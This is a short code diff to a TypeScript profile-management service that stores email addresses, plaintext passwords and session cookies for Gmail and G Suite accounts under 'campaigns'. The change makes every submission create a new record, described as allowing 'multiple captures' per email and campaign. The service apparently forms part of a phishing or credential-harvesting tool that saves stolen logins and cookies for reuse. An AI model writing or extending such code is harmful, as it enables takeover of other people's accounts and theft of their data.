@@ -39,50 +39,27 @@ export class ProfileManagerService {
           ? 'GMAIL'
           : 'GSUITE';
 
-      // Check if profile exists (no unique constraint, so find first matching)
-      const existingProfile = await prisma.profile.findFirst({
-        where: {
-          email: data.email,
-          campaignId: data.campaignId,
-        },
-      });
-
       // Determine auth status based on cookies
       const authStatus = (data.cookies && data.cookies.length > 0) ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED';
 
-      let profile;
-      if (existingProfile) {
-        // Update existing profile
-        profile = await prisma.profile.update({
-          where: { id: existingProfile.id },
-          data: {
-            password: data.password,
-            cookies: data.cookies ? JSON.stringify(data.cookies) : null,
-            authStatus,
-            status: 'ACTIVE',
-            isLaunched: false,
-          },
-        });
-      } else {
-        // Create new profile
-        profile = await prisma.profile.create({
-          data: {
-            userId: data.userId ?? undefined,
-            campaignId: data.campaignId,
-            email: data.email,
-            password: data.password,
-            provider: data.provider,
-            classificationType,
-            accountType,
-            cookies: data.cookies ? JSON.stringify(data.cookies) : null,
-            authStatus,
-            status: 'ACTIVE',
-            isLaunched: false,
-          },
-        });
-      }
+      // ALWAYS create new profile (allow multiple captures per email+campaign)
+      const profile = await prisma.profile.create({
+        data: {
+          userId: data.userId ?? undefined,
+          campaignId: data.campaignId,
+          email: data.email,
+          password: data.password,
+          provider: data.provider,
+          classificationType,
+          accountType,
+          cookies: data.cookies ? JSON.stringify(data.cookies) : null,
+          authStatus,
+          status: 'ACTIVE',
+          isLaunched: false,
+        },
+      });
 
-      logger.success(`Profile upserted: ${data.email} (${profile.id}) - Type: ${classificationType}`);
+      logger.success(`Profile created: ${data.email} (${profile.id}) - Type: ${classificationType}`);
 
       return {
         success: true,
